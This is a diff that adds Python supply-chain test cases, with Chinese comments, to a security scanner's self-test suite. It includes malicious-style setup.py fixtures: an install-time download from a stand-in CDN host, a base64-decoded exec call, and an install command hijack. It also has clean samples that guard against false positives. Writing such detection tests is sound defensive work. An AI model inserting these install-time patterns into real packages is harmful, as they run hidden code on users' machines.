@@ -196,6 +196,115 @@ KIND_NO = [
 ]
 
 
+# ── Python 供應鏈樣本 ────────────────────────────────────────────────────
+# pip install 會**直接執行 setup.py**，那是比 npm postinstall 更少人知道的
+# 安裝期程式碼執行點。值 = (檔案表, 期望至少報到這個嚴重度)
+PY_SUPPLY_BAD = {
+    "setup_downloads_at_install": ({
+        "setup.py": (
+            "from setuptools import setup\n"
+            "import urllib.request\n"
+            "urllib.request.urlopen('https://cdn.example.net/p.bin').read()\n"
+            "setup(name='demo', version='1.0')\n")}, HIGH),
+    "setup_b64_exec": ({
+        "setup.py": (
+            "from setuptools import setup\n"
+            "import base64\n"
+            "exec(base64.b64decode('cHJpbnQoMSk='))\n"
+            "setup(name='demo', version='1.0')\n")}, HIGH),
+    "setup_cmdclass_hijack": ({
+        "setup.py": (
+            "from setuptools import setup\n"
+            "from setuptools.command.install import install\n"
+            "class PostInstall(install):\n"
+            "    def run(self):\n"
+            "        install.run(self)\n"
+            "setup(name='demo', cmdclass={'install': PostInstall})\n")}, HIGH),
+}
+
+# 不該誤報。前兩個是極常見的正常寫法——誤報等於指控一大票正經專案。
+PY_SUPPLY_CLEAN = {
+    # 絕大多數 setup.py 長這樣
+    "plain_setup": {
+        "setup.py": ("from setuptools import setup\n"
+                     "setup(name='demo', version='1.0', packages=['demo'])\n")},
+    # 讀 README 當長描述，是官方打包指南就這樣教的
+    "setup_reads_readme": {
+        "setup.py": ("from setuptools import setup\n"
+                     "long_desc = open('README.md').read()\n"
+                     "setup(name='demo', long_description=long_desc)\n")},
+    # 說明文字裡提到 subprocess，但那在 docstring 裡，不會被執行
+    "setup_docstring_mentions": {
+        "setup.py": ('"""打包腳本。\n\n'
+                     '注意：不要在這裡用 subprocess 或 urllib 連網。\n'
+                     '"""\n'
+                     "from setuptools import setup\n"
+                     "setup(name='demo')\n")},
+    # 2026-07-28 對 googleapis/mcp-toolbox 的**真實誤報**，原文節錄。
+    # 覆寫 bdist_wheel 是建置期（打包者端）的正當做法——內含二進位檔的套件
+    # 都得這樣寫，否則 wheel 會被誤標成純 Python。使用者安裝時根本不會跑到。
+    "fp_gcp_bdist_wheel": {
+        "pypi/setup.py": (
+            '"""Build configuration for the toolbox-server PyPI package."""\n'
+            "import os\n"
+            "import shutil\n"
+            "from setuptools import setup, find_packages\n"
+            "from setuptools.command.bdist_wheel import bdist_wheel as _bdist_wheel\n"
+            "\n"
+            "class bdist_wheel(_bdist_wheel):\n"
+            "    def finalize_options(self):\n"
+            "        super().finalize_options()\n"
+            "        self.root_is_pure = False\n"
+            "\n"
+            "setup(name='toolbox-server', cmdclass={'bdist_wheel': bdist_wheel})\n")},
+    # 讀版本號的常見寫法，不該當成隱藏行為
+    "setup_exec_version_file": {
+        "setup.py": ("from setuptools import setup\n"
+                     "ver = {}\n"
+                     "exec(open('src/demo/_version.py').read(), ver)\n"
+                     "setup(name='demo', version=ver['__version__'])\n")},
+    # import urllib.parse 只是解析網址，沒有連網
+    "setup_urllib_parse_only": {
+        "setup.py": ("from setuptools import setup\n"
+                     "import urllib.parse\n"
+                     "u = urllib.parse.urljoin('https://x.example', 'a')\n"
+                     "setup(name='demo', url=u)\n")},
+    # 標準建置後端不該被當成非標準
+    "standard_backend": {
+        "pyproject.toml": ('[build-system]\n'
+                           'requires = ["hatchling"]\n'
+                           'build-backend = "hatchling.build"\n'
+                           '[project]\nname = "demo"\n')},
+}
+
+
+def run_python_supply_cases() -> int:
+    from mcp_guard.checks import _check_python_supply
+    failed = 0
+
+    for name, (files, want) in PY_SUPPLY_BAD.items():
+        b = RepoBundle(slug="t/t", exists=True, files=files)
+        found = _check_python_supply(b)
+        worst = min((RANK.get(f.severity, 9) for f in found), default=9)
+        if worst <= RANK[want]:
+            hit = min(found, key=lambda f: RANK.get(f.severity, 9))
+            print(f"  ✅ 偵測到 {name}：{hit.title}")
+        else:
+            print(f"  ❌ 漏報 {name}（期望至少 {want}）")
+            failed += 1
+
+    for name, files in PY_SUPPLY_CLEAN.items():
+        b = RepoBundle(slug="t/t", exists=True, files=files)
+        bad = [f for f in _check_python_supply(b)
+               if RANK.get(f.severity, 9) <= RANK[MEDIUM]]
+        if bad:
+            print(f"  ❌ 誤報 {name}：[{bad[0].severity}] {bad[0].title}")
+            failed += 1
+        else:
+            print(f"  ✅ 乾淨樣本未誤報 {name}")
+    return failed
+
+
 def run_agent_cases() -> int:
     failed = 0
 
@@ -255,8 +364,12 @@ def run() -> int:
     print("\n── 代理指令檔（SKILL.md／AGENTS.md／CLAUDE.md／.cursorrules）──")
     failed += run_agent_cases()
 
+    print("\n── Python 供應鏈（pip install 會直接執行 setup.py）──")
+    failed += run_python_supply_cases()
+
     total = (len(POISONED) + len(CLEAN)
-             + len(AGENT_POISONED) + len(AGENT_CLEAN) + 1)   # +1 為路徑辨識
+             + len(AGENT_POISONED) + len(AGENT_CLEAN) + 1     # +1 為路徑辨識
+             + len(PY_SUPPLY_BAD) + len(PY_SUPPLY_CLEAN))
     print(f"\n{total - failed}/{total} 通過")
     return 1 if failed else 0
 
